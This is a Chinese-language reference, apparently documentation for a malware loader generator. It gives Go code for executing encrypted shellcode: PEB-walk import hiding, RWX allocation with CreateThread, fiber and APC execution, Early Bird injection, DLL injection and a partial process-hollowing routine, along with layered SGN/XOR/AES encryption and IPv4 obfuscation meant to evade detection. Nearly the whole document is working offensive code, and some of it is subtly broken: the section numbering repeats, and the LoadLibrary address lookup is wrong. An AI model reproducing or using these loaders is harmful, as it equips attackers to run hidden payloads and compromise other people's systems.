# Shellcode加载 & 执行方式

> **默认行为：所有敏感API通过PEB Walk动态解析，详见 [iat_hiding.md](iat_hiding.md)**

---

## 重要：SGN加密Shellcode执行说明

**SGN加密后的shellcode运行时无需解密SGN层！**

SGN加密后的shellcode自带解码器stub，执行时会自动解码原始shellcode。

**正确的解密流程：**
```
嵌入loader.go的shellcode = SGN加密 + XOR/RC4/AES二次加密 + IPv4混淆

运行时：
1. IPv4反混淆 → 得到二次加密的数据
2. XOR/RC4/AES解密 → 得到SGN加密的shellcode
3. 直接执行 → SGN自动解码（不需要额外处理）
```

**不要对SGN加密的shellcode进行额外解密！**

---

## 本地执行方式

### 编译前准备

**重要：编译前必须初始化Go模块！**

```bash
# 在loader.go所在目录执行
go mod init loader
go mod tidy

# 然后使用CheckGoBuild编译
CheckGoBuild.exe -f loader.go
```

---

### 1. VirtualAlloc + CreateThread（经典方式）- 使用IAT隐藏

**原理：**
- VirtualAlloc分配可执行内存
- RtlMoveMemory复制shellcode
- CreateThread创建执行线程
- **所有API通过PEB Walk动态获取**

**Go实现（默认IAT隐藏版本）：**
```go
package main

import (
    "syscall"
    "unsafe"
)

// 动态获取的API地址（不依赖导入表）
var (
    pVirtualAlloc       uintptr
    pCreateThread       uintptr
    pRtlMoveMemory      uintptr
    pWaitForSingleObject uintptr
)

func executeShellcodeVA(sc []byte) {
    // 初始化API（PEB Walk动态解析）
    initAPIs()
    
    // 分配内存: MEM_COMMIT|MEM_RESERVE=0x1000|0x2000, PAGE_EXECUTE_READWRITE=0x40
    addr, _, _ := syscall.SyscallN(pVirtualAlloc, 0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
    
    // 复制shellcode
    syscall.SyscallN(pRtlMoveMemory, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    // 创建线程执行
    thread, _, _ := syscall.SyscallN(pCreateThread, 0, 0, addr, 0, 0, 0)
    syscall.SyscallN(pWaitForSingleObject, thread, 0xFFFFFFFF)
}

// initAPIs使用PEB Walk获取所有敏感API地址
func initAPIs() {
    kernel32Base := getModuleHandle("kernel32.dll")
    
    pVirtualAlloc = getProcAddress(kernel32Base, "VirtualAlloc")
    pCreateThread = getProcAddress(kernel32Base, "CreateThread")
    pRtlMoveMemory = getProcAddress(kernel32Base, "RtlMoveMemory")
    pWaitForSingleObject = getProcAddress(kernel32Base, "WaitForSingleObject")
}

// getModuleHandle和getProcAddress实现见 iat_hiding.md
```

### 2. Fiber执行

**原理：**
- Fiber是轻量级线程
- ConvertThreadToFiber转换当前线程
- CreateFiber创建执行Fiber
- SwitchToFiber切换执行

**Go实现：**
```go
func executeShellcodeFiber(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
    CreateFiber := kernel32.NewProc("CreateFiber")
    SwitchToFiber := kernel32.NewProc("SwitchToFiber")
    
    // 分配内存并复制shellcode
    addr := allocAndCopyShellcode(sc)
    
    // Fiber执行
    ConvertThreadToFiber.Call(0)
    fiber, _, _ := CreateFiber.Call(0, addr, 0)
    SwitchToFiber.Call(fiber)
}
```

### 3. syscall.SyscallN调用NT函数 + CreateThread执行（推荐）

**重要警告：不能直接用syscall.SyscallN调用shellcode地址！**

syscall.SyscallN在调用时会修改栈状态，Shellcode期望干净的栈环境，直接调用会崩溃。
正确用法：syscall.SyscallN用于调用NT函数（如NtAllocateVirtualMemory），但shellcode执行必须用CreateThread。

**原理：**
- syscall.SyscallN用于调用NTDLL/KERNEL32函数地址
- shellcode执行必须通过CreateThread创建干净线程
- 稳定性最高

**Go实现（推荐）：**
```go
import "syscall"

func executeShellcodeSyscall(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    // 分配RWX内存（使用syscall.SyscallN调用API）
    addr, _, _ := syscall.SyscallN(VirtualAlloc.Addr(), 0, uintptr(len(sc)), 0x3000, 0x40)
    if addr == 0 {
        return
    }
    
    // 复制shellcode
    syscall.SyscallN(RtlMoveMemory.Addr(), addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    // 【必须】CreateThread创建线程执行shellcode（不能用syscall.SyscallN(addr)）
    thread, _, _ := syscall.SyscallN(CreateThread.Addr(), 0, 0, addr, 0, 0, 0)
    syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
}
```

### 4. CreateThread执行（经典稳定）

**Go实现：**
```go
func executeShellcodeCreateThread(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
```

### 5. APC自注入

**原理：**
- QueueUserAPC插入异步过程调用
- SleepEx触发APC执行（Alertable=TRUE）

**Go实现：**
```go
func executeShellcodeAPC(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    QueueUserAPC := kernel32.NewProc("QueueUserAPC")
    SleepEx := kernel32.NewProc("SleepEx")
    GetCurrentThread := kernel32.NewProc("GetCurrentThread")
    
    addr := allocAndCopyShellcode(sc)
    thread, _, _ := GetCurrentThread.Call()
    QueueUserAPC.Call(addr, thread, 0)
    SleepEx.Call(0, 1) // Alertable = TRUE
}
```

### 5. Early Bird注入

**原理：**
- 创建挂起进程（CREATE_SUSPENDED）
- 写入shellcode到新进程内存
- QueueUserAPC到主线程
- ResumeThread恢复执行

**Go实现：**
```go
func earlyBirdInjection(sc []byte, targetExe string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    CreateProcess := kernel32.NewProc("CreateProcessW")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    QueueUserAPC := kernel32.NewProc("QueueUserAPC")
    ResumeThread := kernel32.NewProc("ResumeThread")
    
    // 创建挂起进程
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Size = uint32(unsafe.Sizeof(si))
    targetExePtr, _ := windows.UTF16PtrFromString(targetExe)
    
    CreateProcess.Call(0, uintptr(unsafe.Pointer(targetExePtr)), 0, 0, 0, 
        0x4, // CREATE_SUSPENDED
        0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
    
    // 在新进程分配内存
    remoteAddr, _, _ := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(sc)), 
        0x1000|0x2000, 0x40)
    
    // 写入shellcode
    WriteProcessMemory.Call(uintptr(pi.Process), remoteAddr, 
        uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
    
    // APC注入到主线程
    QueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
    
    // 恢复线程执行
    ResumeThread.Call(uintptr(pi.Thread))
}
```

---

## 远程注入方式

### 1. 经典DLL注入

**原理：**
- OpenProcess打开目标进程
- VirtualAllocEx分配内存
- WriteProcessMemory写入DLL路径
- CreateRemoteThread调用LoadLibrary

**Go实现：**
```go
func classicDLLInjection(pid uint32, dllPath string) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    LoadLibraryA := kernel32.NewProc("LoadLibraryA")
    
    // 打开目标进程
    process, _, _ := OpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
    
    // 分配内存写入DLL路径
    pathBytes := []byte(dllPath + "\x00")
    remoteAddr, _, _ := VirtualAllocEx.Call(process, 0, uintptr(len(pathBytes)), 
        0x1000|0x2000, 0x40)
    WriteProcessMemory.Call(process, remoteAddr, uintptr(unsafe.Pointer(&pathBytes[0])), 
        uintptr(len(pathBytes)), 0)
    
    // 获取LoadLibrary地址
    loadLibraryAddr, _, _ := LoadLibraryA.Call()
    
    // 创建远程线程执行LoadLibrary
    CreateRemoteThread.Call(process, 0, 0, loadLibraryAddr, remoteAddr, 0, 0)
}
```

### 2. 进程镂空（Process Hollowing）

**原理：**
- CreateProcess创建挂起进程
- GetThreadContext获取上下文
- NtUnmapViewOfSection卸载主模块
- VirtualAllocEx分配新内存
- WriteProcessMemory写入shellcode
- SetThreadContext修改入口点
- ResumeThread恢复执行

**Go实现：**
```go
func processHollowing(targetExe string, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    
    CreateProcess := kernel32.NewProc("CreateProcessW")
    GetThreadContext := kernel32.NewProc("GetThreadContext")
    NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    SetThreadContext := kernel32.NewProc("SetThreadContext")
    ResumeThread := kernel32.NewProc("ResumeThread")
    
    // 创建挂起进程
    // ...
}
```

### 3. 映射注入

**原理：**
- 创建文件映射
- MapViewOfFile映射到当前进程
- MapViewOfFile2映射到目标进程
- 直接写入shellcode

### 4. 幽灵注入（Ghost Injection）

**原理：**
- 创建空洞进程
- 特殊内存操作注入

---

## 辅助函数

### 内存分配和复制

```go
func allocAndCopyShellcode(sc []byte) uintptr {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    
    return addr
}
```

---

## 常用内存常量

| 常量 | 值 | 说明 |
|------|-----|------|
| MEM_COMMIT | 0x1000 | 提交内存 |
| MEM_RESERVE | 0x2000 | 保留内存 |
| PAGE_EXECUTE_READWRITE | 0x40 | 可执行可读写 |
| PAGE_EXECUTE_READ | 0x20 | 可执行只读 |
| CREATE_SUSPENDED | 0x4 | 创建挂起进程 |
| PROCESS_ALL_ACCESS | 0x1F0FFF | 进程完全访问 |